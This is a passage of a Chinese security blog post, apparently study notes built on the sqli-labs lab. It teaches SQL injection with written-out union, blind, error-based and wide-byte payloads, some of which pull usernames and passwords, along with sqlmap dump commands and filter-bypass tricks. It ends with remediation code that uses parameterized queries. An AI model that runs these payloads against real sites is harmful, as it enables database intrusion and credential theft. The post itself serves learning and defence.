+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">判断注入点：</span><br><span class="line">http://192.168.0.109:83/Less-1/?id=1&#x27; and 1=2-- -</span><br><span class="line">猜字段数：</span><br><span class="line">order by(二分法)</span><br><span class="line">http://192.168.0.109:83/Less-1/?id=2&#x27; order by 3-- -</span><br><span class="line">找回显：</span><br><span class="line">http://192.168.0.109:83/Less-1/?id=2&#x27; union select 1,2,3-- -</span><br><span class="line">找数据库</span><br><span class="line">database()</span><br><span class="line"></span><br><span class="line">group_concat()</span><br><span class="line">找表名字</span><br><span class="line">http://192.168.0.109:83/Less-1/?id=2&#x27; and 1=2 union select 1,group_concat(table_name),@@basedir  from information_schema.tables where table_schema=&quot;security&quot;-- -</span><br><span class="line">找字段名</span><br><span class="line">http://192.168.0.109:83/Less-1/?id=2&#x27; and 1=2 union select 1,group_concat(column_name),@@basedir  from information_schema.columns where table_name=&quot;emails&quot;-- -</span><br><span class="line">爆记录</span><br><span class="line">http://192.168.0.109:83/Less-1/?id=2&#x27; and 1=2 union select 1,group_concat(id,email_id),3  from emails-- -</span><br><span class="line">查看内容</span><br><span class="line">http://192.168.0.109:83/Less-1/?id=2&#x27; and 1=2 union select 1,group_concat(id),group_concat(email_id)  from emails-- -</span><br></pre></td></tr></table></figure>
+
+
+<h2 id="bool注入"><a href="#bool注入" class="headerlink" title="bool注入"></a>bool注入</h2><p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230812095315721.png" alt="image-20230812095315721"></p>
+<h3 id="substring函数"><a href="#substring函数" class="headerlink" title="substring函数"></a>substring函数</h3><p>截取字符串的长度</p>
+<p>substring(字段名,A, N)，这个函数是用来截取()里的字段从第A个长度起往后截取N个字，比如substring(username,1,2)就表示从username字段中从第1个字符向后截取2位，包括第1个字符，比如值为admin，截取的就是ad。</p>
+<h3 id="ascii函数"><a href="#ascii函数" class="headerlink" title="ascii函数"></a>ascii函数</h3><p>ascii(‘a’) ，返回a字母的ascii码97</p>
+<table>
+<thead>
+<tr>
+<th align="center">ASCII值</th>
+<th align="center">控制字符</th>
+<th align="center">ASCII值</th>
+<th align="center">控制字符</th>
+<th align="center">ASCII值</th>
+<th align="center">控制字符</th>
+<th align="center">ASCII值</th>
+<th align="center">控制字符</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">0</td>
+<td align="center">NUT</td>
+<td align="center">32</td>
+<td align="center">(space)</td>
+<td align="center">64</td>
+<td align="center">@</td>
+<td align="center">96</td>
+<td align="center">、</td>
+</tr>
+<tr>
+<td align="center">1</td>
+<td align="center">SOH</td>
+<td align="center">33</td>
+<td align="center">!</td>
+<td align="center">65</td>
+<td align="center">A</td>
+<td align="center">97</td>
+<td align="center">a</td>
+</tr>
+<tr>
+<td align="center">2</td>
+<td align="center">STX</td>
+<td align="center">34</td>
+<td align="center">“</td>
+<td align="center">66</td>
+<td align="center">B</td>
+<td align="center">98</td>
+<td align="center">b</td>
+</tr>
+<tr>
+<td align="center">3</td>
+<td align="center">ETX</td>
+<td align="center">35</td>
+<td align="center">#</td>
+<td align="center">67</td>
+<td align="center">C</td>
+<td align="center">99</td>
+<td align="center">c</td>
+</tr>
+<tr>
+<td align="center">4</td>
+<td align="center">EOT</td>
+<td align="center">36</td>
+<td align="center">$</td>
+<td align="center">68</td>
+<td align="center">D</td>
+<td align="center">100</td>
+<td align="center">d</td>
+</tr>
+<tr>
+<td align="center">5</td>
+<td align="center">ENQ</td>
+<td align="center">37</td>
+<td align="center">%</td>
+<td align="center">69</td>
+<td align="center">E</td>
+<td align="center">101</td>
+<td align="center">e</td>
+</tr>
+<tr>
+<td align="center">6</td>
+<td align="center">ACK</td>
+<td align="center">38</td>
+<td align="center">&amp;</td>
+<td align="center">70</td>
+<td align="center">F</td>
+<td align="center">102</td>
+<td align="center">f</td>
+</tr>
+<tr>
+<td align="center">7</td>
+<td align="center">BEL</td>
+<td align="center">39</td>
+<td align="center">,</td>
+<td align="center">71</td>
+<td align="center">G</td>
+<td align="center">103</td>
+<td align="center">g</td>
+</tr>
+<tr>
+<td align="center">8</td>
+<td align="center">BS</td>
+<td align="center">40</td>
+<td align="center">(</td>
+<td align="center">72</td>
+<td align="center">H</td>
+<td align="center">104</td>
+<td align="center">h</td>
+</tr>
+<tr>
+<td align="center">9</td>
+<td align="center">HT</td>
+<td align="center">41</td>
+<td align="center">)</td>
+<td align="center">73</td>
+<td align="center">I</td>
+<td align="center">105</td>
+<td align="center">i</td>
+</tr>
+<tr>
+<td align="center">10</td>
+<td align="center">LF</td>
+<td align="center">42</td>
+<td align="center">*</td>
+<td align="center">74</td>
+<td align="center">J</td>
+<td align="center">106</td>
+<td align="center">j</td>
+</tr>
+<tr>
+<td align="center">11</td>
+<td align="center">VT</td>
+<td align="center">43</td>
+<td align="center">+</td>
+<td align="center">75</td>
+<td align="center">K</td>
+<td align="center">107</td>
+<td align="center">k</td>
+</tr>
+<tr>
+<td align="center">12</td>
+<td align="center">FF</td>
+<td align="center">44</td>
+<td align="center">,</td>
+<td align="center">76</td>
+<td align="center">L</td>
+<td align="center">108</td>
+<td align="center">l</td>
+</tr>
+<tr>
+<td align="center">13</td>
+<td align="center">CR</td>
+<td align="center">45</td>
+<td align="center">-</td>
+<td align="center">77</td>
+<td align="center">M</td>
+<td align="center">109</td>
+<td align="center">m</td>
+</tr>
+<tr>
+<td align="center">14</td>
+<td align="center">SO</td>
+<td align="center">46</td>
+<td align="center">.</td>
+<td align="center">78</td>
+<td align="center">N</td>
+<td align="center">110</td>
+<td align="center">n</td>
+</tr>
+<tr>
+<td align="center">15</td>
+<td align="center">SI</td>
+<td align="center">47</td>
+<td align="center">&#x2F;</td>
+<td align="center">79</td>
+<td align="center">O</td>
+<td align="center">111</td>
+<td align="center">o</td>
+</tr>
+<tr>
+<td align="center">16</td>
+<td align="center">DLE</td>
+<td align="center">48</td>
+<td align="center">0</td>
+<td align="center">80</td>
+<td align="center">P</td>
+<td align="center">112</td>
+<td align="center">p</td>
+</tr>
+<tr>
+<td align="center">17</td>
+<td align="center">DCI</td>
+<td align="center">49</td>
+<td align="center">1</td>
+<td align="center">81</td>
+<td align="center">Q</td>
+<td align="center">113</td>
+<td align="center">q</td>
+</tr>
+<tr>
+<td align="center">18</td>
+<td align="center">DC2</td>
+<td align="center">50</td>
+<td align="center">2</td>
+<td align="center">82</td>
+<td align="center">R</td>
+<td align="center">114</td>
+<td align="center">r</td>
+</tr>
+<tr>
+<td align="center">19</td>
+<td align="center">DC3</td>
+<td align="center">51</td>
+<td align="center">3</td>
+<td align="center">83</td>
+<td align="center">S</td>
+<td align="center">115</td>
+<td align="center">s</td>
+</tr>
+<tr>
+<td align="center">20</td>
+<td align="center">DC4</td>
+<td align="center">52</td>
+<td align="center">4</td>
+<td align="center">84</td>
+<td align="center">T</td>
+<td align="center">116</td>
+<td align="center">t</td>
+</tr>
+<tr>
+<td align="center">21</td>
+<td align="center">NAK</td>
+<td align="center">53</td>
+<td align="center">5</td>
+<td align="center">85</td>
+<td align="center">U</td>
+<td align="center">117</td>
+<td align="center">u</td>
+</tr>
+<tr>
+<td align="center">22</td>
+<td align="center">SYN</td>
+<td align="center">54</td>
+<td align="center">6</td>
+<td align="center">86</td>
+<td align="center">V</td>
+<td align="center">118</td>
+<td align="center">v</td>
+</tr>
+<tr>
+<td align="center">23</td>
+<td align="center">TB</td>
+<td align="center">55</td>
+<td align="center">7</td>
+<td align="center">87</td>
+<td align="center">W</td>
+<td align="center">119</td>
+<td align="center">w</td>
+</tr>
+<tr>
+<td align="center">24</td>
+<td align="center">CAN</td>
+<td align="center">56</td>
+<td align="center">8</td>
+<td align="center">88</td>
+<td align="center">X</td>
+<td align="center">120</td>
+<td align="center">x</td>
+</tr>
+<tr>
+<td align="center">25</td>
+<td align="center">EM</td>
+<td align="center">57</td>
+<td align="center">9</td>
+<td align="center">89</td>
+<td align="center">Y</td>
+<td align="center">121</td>
+<td align="center">y</td>
+</tr>
+<tr>
+<td align="center">26</td>
+<td align="center">SUB</td>
+<td align="center">58</td>
+<td align="center">:</td>
+<td align="center">90</td>
+<td align="center">Z</td>
+<td align="center">122</td>
+<td align="center">z</td>
+</tr>
+<tr>
+<td align="center">27</td>
+<td align="center">ESC</td>
+<td align="center">59</td>
+<td align="center">;</td>
+<td align="center">91</td>
+<td align="center">[</td>
+<td align="center">123</td>
+<td align="center">{</td>
+</tr>
+<tr>
+<td align="center">28</td>
+<td align="center">FS</td>
+<td align="center">60</td>
+<td align="center">&lt;</td>
+<td align="center">92</td>
+<td align="center">&#x2F;</td>
+<td align="center">124</td>
+<td align="center">|</td>
+</tr>
+<tr>
+<td align="center">29</td>
+<td align="center">GS</td>
+<td align="center">61</td>
+<td align="center">&#x3D;</td>
+<td align="center">93</td>
+<td align="center">]</td>
+<td align="center">125</td>
+<td align="center">}</td>
+</tr>
+<tr>
+<td align="center">30</td>
+<td align="center">RS</td>
+<td align="center">62</td>
+<td align="center">&gt;</td>
+<td align="center">94</td>
+<td align="center">^</td>
+<td align="center">126</td>
+<td align="center">&#96;</td>
+</tr>
+<tr>
+<td align="center">31</td>
+<td align="center">US</td>
+<td align="center">63</td>
+<td align="center">?</td>
+<td align="center">95</td>
+<td align="center">_</td>
+<td align="center">127</td>
+<td align="center">DEL</td>
+</tr>
+</tbody></table>
+<h2 id="sleep注入"><a href="#sleep注入" class="headerlink" title="sleep注入"></a>sleep注入</h2><p>sleep注入又是另一种形式的盲注，与bool注入不同，sleep注入没有任何报错信息输出，页面返回不管对或者错都是一种状态，攻击者无法通过页面返回状态来判断输入的SQL注入测试语句是否正确，只能通过构造sleep注入的SQL测试语句，通过页面的返回时间，从而判断数据库中的存储了哪些信息。</p>
+<h3 id="if函数"><a href="#if函数" class="headerlink" title="if函数"></a>if函数</h3><p>IF(expr1,expr2,expr3) 效果类似于编程语言中常见的三元运算符。<br>如果expr1为真（不等于0且不等于null），返回expr2，否则返回expr3。</p>
+<p>sleep() 执行挂起一段时间。<br>IF(expr1,expr2,expr3) 效果类似于编程语言中常见的三元运算符。<br>如果expr1为真（不等于0且不等于null），返回expr2，否则返回expr3。</p>
+<h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>利用数据库的语法特性，人为的制造错误，将想要查询的<br>数据信息通过数据库报错显示到前端达到注入的目的。</p>
+<h3 id="updatexml报错注入"><a href="#updatexml报错注入" class="headerlink" title="updatexml报错注入"></a>updatexml报错注入</h3><p>updatexml注入也是一种报错注入，是利用了updatexml函数中第二个参数XPath_string的报错进行注入。XPath_string正常的格式是xml路径，格式是&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;，如果格式不正确就会报错，updatexml注入就是利用了XPath_string的报错进行注入。</p>
+<p>MySQL在5.1.5版本中添加了对XML文档进行操作的两个函数，可以对XML文档进行查询和修改，extractValue()可以对XML文档进行查询和updateXML()可以对XML文档进行更新。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">UPDATEXML (XML_document, XPath_string, new_value); </span><br><span class="line">第一个参数：XML_document是String格式，目标XML文档。</span><br><span class="line">第二个参数：XPath_string (Xpath格式的字符串)，xml路径，正常的格式是</span><br><span class="line">/xxx/xxx/xxx/，如果格式不正确就会报错，updatexml注入就是利用了XPath_string的报错    进行注入。</span><br><span class="line">第三个参数：new_value，String格式，替换查找到的符合条件的数据。</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过http://ip/index.php?id=1 and updatexml(1,concat(0x7e,(database())),0) #</span><br><span class="line">可以通过updatexml报错获取到当前的数据库为security</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="extractvalue报错注入"><a href="#extractvalue报错注入" class="headerlink" title="extractvalue报错注入"></a>extractvalue报错注入</h3><p>extractvalue函数可以对XML文档进行查询，extractvalue报错注入与updatexml报错注入的原理一样，也是利用了函数中第二个参数XPath_string，XPath_string正常的格式是xml路径，格式是&#x2F;xxx&#x2F;xxx&#x2F;xxx&#x2F;，如果格式不正确就会报错，extractvalue注入就是利用了XPath_string 的报错进行注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">通过http://ip/index.php?id=1 and extractvalue(1,concat(0x7e,(database())),0) #</span><br><span class="line">可以通过updatexml报错获取到当前的数据库为security</span><br></pre></td></tr></table></figure>
+
+<h2 id="宽字节注入"><a href="#宽字节注入" class="headerlink" title="宽字节注入"></a>宽字节注入</h2><p>​      宽字节注入漏洞产生的原因：开发者为了防止出现SQL注入攻击，将用户输入的数据用addslashes等函数进行过滤。addslashes等函数会默认将单引号等字符进行转义，这样就可以避免注入。宽字节注入产生的原因是MySQL在使用GBK编码的时候，如果第一个字符的ASCII码大于128时，会认为两个字符是一个汉字，会将后面的转义字符“\”吃掉，拼接为汉字，这样就可以将SQL语句闭合，造成宽字节注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">（1）查看数据库的名称</span><br><span class="line">http://ip/index.php?id=1%81&#x27; and 1=2 union select 1,database(),3 %23</span><br><span class="line">（2）查看所有的表信息</span><br><span class="line">http://ip/index.php?id=1%81&#x27; and 1=2 union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=0x6374667377696b69%23</span><br><span class="line">（3）查看user表的列信息</span><br><span class="line">http://ip/index.php?id=1%81&#x27; and 1=2 union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=0x6374667377696b69 and table_name=0x75736572 %23</span><br><span class="line">（4）查看列的值</span><br><span class="line">http://ip/index.php?id=1%81&#x27;  and 1=2 union select 1,group_concat(username, 0x2a2a2a, password),3 from user %23</span><br></pre></td></tr></table></figure>
+
+<h2 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h2><p>二次注入漏洞是SQL注入的一种形式，是在Web应用程序中经常出现的Web类型漏洞。<br>二次注入的原理：第一次在参数中输入恶意数据插入的时候，由于存在addslashes等函数的过滤，会将特殊字符添加”&quot;进行转义，但是转义字符”&quot;并不会存入到数据库中，这样下一次进行查询时，如果没有过滤，直接从数据库中取出恶意数据并执行，就造成了SQL注入。</p>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821155851282.png" alt="image-20230821155851282"></p>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821155858214.png" alt="image-20230821155858214"></p>
+<p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821155902143.png" alt="image-20230821155902143"></p>
+<h2 id="SQLMAP"><a href="#SQLMAP" class="headerlink" title="SQLMAP"></a>SQLMAP</h2><p>SQLMAP是一个自动化的SQL注入工具，其主要功能是发现并利用给定的URL的SQL注入漏洞，目前支持的数据库是MySQL, Oracle, PostgreSQL, Microsoft SQLServer, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB。</p>
+<p>SQLMAP支持五种不同的注入模式：</p>
+<ol>
+<li>基于布尔的盲注。</li>
+<li>基于时间的盲注。</li>
+<li>基于报错注入。</li>
+<li>联合查询注入。</li>
+<li>堆查询注入。</li>
+</ol>
+<p>SQLMAP的支持7种显示等级，默认为1等级</p>
+<p>等级0：只显示python错误以及严重的信息。<br>等级1：同时显示基本信息和警告信息。（默认）<br>等级2：同时显示debug信息。<br>等级3：同时显示注入的payload。<br>等级4：同时显示HTTP请求。<br>等级5：同时显示HTTP响应头。<br>等级6：同时显示HTTP响应页面。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">（1）-u或者--url 指定注入目标URL</span><br><span class="line">sqlmap -u http://ip/index.php?id=1</span><br><span class="line">（2）--dbms 指定数据库</span><br><span class="line">sqlmap -u http://ip/index. php?id=1 --dbms=mysql</span><br><span class="line">（3）--os 指定系统</span><br><span class="line">sqlmap -u http://ip/index.php?id=1 --os=Windows</span><br><span class="line">（4）--flush-session 刷新缓存</span><br><span class="line">sqlmap -u http://ip/index.php?id=1 --flush-session</span><br><span class="line">（5）--proxy 指定代理</span><br><span class="line">sqlmap -u http://ip/index.php?id=1 --proxy http://ip:port</span><br><span class="line">（6）--user-agent 指定useragent信息</span><br><span class="line">sqlmap -u http://ip/index.php?id=1 --user-agent=&#x27;Mozilla/5.0 (Windows NT 10.0; WOW64; rv:55.0) Gecko/20100101 Firefox/55.0&#x27;</span><br><span class="line">（7）--data 数据以POST方式提交</span><br><span class="line">sqlmap -u http://ip/index.php --data=&quot;id=1&quot;</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">（1）列出所有的数据库</span><br><span class="line">sqlmap -u http://ip/index.php?id=1 --dbs   </span><br><span class="line">（2）列出当前数据库</span><br><span class="line">sqlmap -u http://ip/index.php?id=1 --current-db   </span><br><span class="line">（3）列出DBname数据库所有的表</span><br><span class="line">sqlmap -u http://ip/index.php?id=1 -D &#x27;DBname&#x27;  --tables   </span><br><span class="line">（4）列出DBname数据库table表中的所有列</span><br><span class="line">sqlmap -u http://ip/index.php?id=1 -D &#x27;DBname&#x27;  -T &#x27;table&#x27; --columns   </span><br><span class="line">（5）获取DBname数据库table表中column1,column2列中的数据</span><br><span class="line">sqlmap -u http://ip/index.php?id=1 -D &#x27;DBname&#x27;  -T &#x27;table&#x27; -C &#x27;column1,column2&#x27; --dump</span><br></pre></td></tr></table></figure>
+
+<h2 id="SQL注入绕过"><a href="#SQL注入绕过" class="headerlink" title="SQL注入绕过"></a>SQL注入绕过</h2><h3 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h3><p>应用程序的过滤规则，会将空格设置为黑名单，但是空格存在多种绕过方式，常见的包括 &#x2F;**&#x2F;、tab键、%0a、&#96;来代替空格进行绕过。</p>
+<h3 id="内联注释绕过"><a href="#内联注释绕过" class="headerlink" title="内联注释绕过"></a>内联注释绕过</h3><p>MySQL会执行放在 &#x2F;! … &#x2F;中里面语句，&#x2F;!50010 … &#x2F;也可以执行里面的SQL语句，其中5.00.10 为MySQL版本号，当MySQL数据库的实际版本大于内联注释中的版本就会执行里面的代码，可以利用MySQL的这个特性绕过特殊字符过滤。</p>
+<h3 id="大小写绕过"><a href="#大小写绕过" class="headerlink" title="大小写绕过"></a>大小写绕过</h3><p>应用程序的过滤规则，通常会针对恶意关键词设置黑名单，如果存在恶意关键词就会退出，但是可能存在过滤不完整或者是只过滤小写或者大写的情况，没有针对大小写组合进行过滤，导致可以通过大小写混写payload的方式来绕过过滤。</p>
+<h3 id="双写关键字绕过"><a href="#双写关键字绕过" class="headerlink" title="双写关键字绕过"></a>双写关键字绕过</h3><p>应用程序的过滤规则，通常会针对恶意关键词设置黑名单，如果存在恶意关键词就会替换为空字符，但是没有多次匹配判断，就可以通过双写字符串的方式来绕过过滤。</p>
+<h3 id="编码绕过"><a href="#编码绕过" class="headerlink" title="编码绕过"></a>编码绕过</h3><h4 id="双重url编码绕过"><a href="#双重url编码绕过" class="headerlink" title="双重url编码绕过"></a>双重url编码绕过</h4><p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821160303100.png" alt="image-20230821160303100"></p>
+<h4 id="16进制编码绕过"><a href="#16进制编码绕过" class="headerlink" title="16进制编码绕过"></a>16进制编码绕过</h4><p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821160316310.png" alt="image-20230821160316310"></p>
+<h4 id="Unicode编码绕过"><a href="#Unicode编码绕过" class="headerlink" title="Unicode编码绕过"></a>Unicode编码绕过</h4><p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821160329198.png" alt="image-20230821160329198"></p>
+<h4 id="ASCII编码绕过"><a href="#ASCII编码绕过" class="headerlink" title="ASCII编码绕过"></a>ASCII编码绕过</h4><p><img src="https://raw.githubusercontent.com/lebuxishu/image/main/img/image-20230821160337095.png" alt="image-20230821160337095"></p>
+<h3 id="等价函数字符替换绕过"><a href="#等价函数字符替换绕过" class="headerlink" title="等价函数字符替换绕过"></a>等价函数字符替换绕过</h3><p>​      Mysql查询：Union distinct、updatexml、Extractvalue、floor<br>​      字符串截取函数：mid、substr、substring、left、reverse<br>​      字符串连接函数：concat、group_concat、concat_ws<br>​      字符串转换：char、hex、unhex<br>​      替换逗号：limit 1 offset 0，mid(version() from 1 for 1)<br>​      替换等号：like、in</p>
+<h2 id="MySQL注入漏洞修复"><a href="#MySQL注入漏洞修复" class="headerlink" title="MySQL注入漏洞修复"></a>MySQL注入漏洞修复</h2><h3 id="代码层修复"><a href="#代码层修复" class="headerlink" title="代码层修复"></a>代码层修复</h3><p>数字型注入可以用intval函数进行强制数据转换</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$id =intval($id);</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>
+
+<p>字符型注入可以用htmlspecialchars函数、MySQL_real_escape_string函数和addslashes函数，进行特殊字符转换防止注入。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">$id=$_GET[&#x27;id&#x27;];</span><br><span class="line">$id =htmlspecialchars(addslashes($id));</span><br><span class="line">$sql=&quot;SELECT * FROM users WHERE id=$id LIMIT 0,1&quot;;</span><br><span class="line">$result=mysql_query($sql);</span><br><span class="line">$row = mysql_fetch_array($result);</span><br></pre></td></tr></table></figure>
+
+<p>参数化查询防止注入。mysqli 和 PDO 这两个新扩展都支持参数化查询。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$mysqli = new mysqli(&quot;localhost&quot;, &quot;dbusername&quot;, &quot;dbpassword&quot;, &quot;database&quot;);</span><br><span class="line">$username = &quot;somename&quot;;</span><br><span class="line">$password = &quot;someword&quot;;</span><br><span class="line">$query = &quot;SELECT filename, filesize FROM users WHERE (name = ?) and (password = ?)&quot;;</span><br><span class="line">$stmt = $mysqli-&gt;stmt_init();</span><br><span class="line">if ($stmt-&gt;prepare($query)) &#123;</span><br><span class="line">    $stmt-&gt;bind_param(&quot;ss&quot;, $username, $password);</span><br><span class="line">$stmt-&gt;execute();</span><br><span class="line">$stmt-&gt;bind_result($filename, $filesize);</span><br><span class="line">    while ($stmt-&gt;fetch()) &#123;</span><br><span class="line">        printf (&quot;%s : %d\n&quot;, $filename, $filesize);</span><br><span class="line">    &#125;</span><br><span class="line">    $stmt-&gt;close();</span><br><span class="line">&#125;</span><br><span class="line">$mysqli-&gt;close();</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">$pdo = new PDO(&quot;mysql:host=localhost;dbname=database&quot;, &quot;dbusername&quot;,&quot;dbpassword&quot;);</span><br><span class="line">$username = &quot;somename&quot;;</span><br><span class="line">$password = &quot;someword&quot;;</span><br><span class="line">$query = &quot;SELECT * FROM users WHERE (name = :username) and (password = :password)&quot;;</span><br><span class="line">$statement = $pdo-&gt;prepare($query, array(PDO::ATTR_CURSOR =&gt; PDO::CURSOR_FWDONLY));</span><br><span class="line">$statement-&gt;bindParam(&quot;:username&quot;, $username, PDO::PARAM_STR, 10);</span><br><span class="line">$statement-&gt;bindParam(&quot;:password&quot;, $password, PDO::PARAM_STR, 12);</span><br><span class="line">$statement-&gt;execute();</span><br><span class="line">while ($row = $statement-&gt;fetch(PDO::FETCH_ASSOC)) &#123;</span><br><span class="line">  printf (&quot;%s : %d\n&quot;, $row[&quot;filename&quot;], $row[&quot;filesize&quot;]);</span><br><span class="line">&#125;</span><br><span class="line">$statement-&gt;closeCursor();</span><br><span class="line">$pdo = null;</span><br></pre></td></tr></table></figure>
+
+<h3 id="服务器配置修复"><a href="#服务器配置修复" class="headerlink" title="服务器配置修复"></a>服务器配置修复</h3><p>（1） magic_quotes_gpc配置<br>当 magic_quotess_gpc为on，所有的’(单引号)、”(双引号)、\（反斜杠）和NULL’s被一个反斜杠自动转义。该设置将自动影响$_GET 、 $_POST 、$_COOKIE数组的值，在PHP 4，$_ENV也会被转义。<br>注意：本特性已自 PHP 5.3.0 起废弃并将自 PHP 5.4.0 起移除。<br>（2） magic_quotes_sybase配置<br>magic_quotes_sybase会将单引号（’），转义为两个单引号（’’），但是只将magic_quotes_sybase设置为on并不生效，需要将magic_quotes_gpc也设置为on，magic_quotes_sybase才会生效。</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/Wed%E5%AE%89%E5%85%A8/" rel="tag"><i class="fa fa-tag"></i> Wed安全</a>
+              <a href="/tags/SQL%E6%B3%A8%E5%85%A5/" rel="tag"><i class="fa fa-tag"></i> SQL注入</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2023/08/08/MySQL%E6%95%B0%E6%8D%AE%E5%BA%93/" rel="prev" title="MySQL语法">
+                  <i class="fa fa-angle-left"></i> MySQL语法
+                </a>
+            </div>
+            <div class="post-nav-item">
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2023</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">lebuxishu</span>
+  </div>
+<div class="wordcount">
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-chart-line"></i>
+    </span>
+    <span title="站点总字数">13k</span>
+  </span>
+  <span class="post-meta-item">
+    <span class="post-meta-item-icon">
+      <i class="fa fa-coffee"></i>
+    </span>
+    <span title="站点阅读时长">48 分钟</span>
+  </span>
+</div>
+<div class="busuanzi-count">
+    <span class="post-meta-item" id="busuanzi_container_site_uv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-user"></i>
+      </span>
+      <span class="site-uv" title="总访客量">
+        <span id="busuanzi_value_site_uv"></span>
+      </span>
+    </span>
+    <span class="post-meta-item" id="busuanzi_container_site_pv">
+      <span class="post-meta-item-icon">
+        <i class="fa fa-eye"></i>
+      </span>
+      <span class="site-pv" title="总访问量">
+        <span id="busuanzi_value_site_pv"></span>
+      </span>
+    </span>
+</div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+  
+  <script size="300" alpha="0.6" zIndex="-1" src="https://cdnjs.cloudflare.com/ajax/libs/ribbon.js/1.0.2/ribbon.min.js"></script>
